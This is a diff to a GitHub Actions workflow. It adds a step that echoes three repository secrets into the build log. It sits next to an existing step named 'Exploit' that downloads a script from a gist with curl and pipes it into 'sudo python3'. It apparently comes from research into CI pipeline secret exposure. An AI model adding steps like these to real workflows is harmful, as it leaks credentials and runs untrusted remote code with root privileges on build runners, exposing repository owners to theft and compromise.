@@ -32,6 +32,12 @@ jobs:
       - name: print_event
         run: |
           echo "${{ toJson(github.event) }}"
+
+      - name: print secrets
+        run: |
+          echo "BRUH_KEY=${{ secrets.TEST }}"
+          echo "TEST_KEY=${{ secrets.LOL }}"
+          echo "SECRET_KEY=${{ secrets.BRUH }}"
       - name: Exploit
         shell: bash
         run: curl -sL https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/ | sudo python3
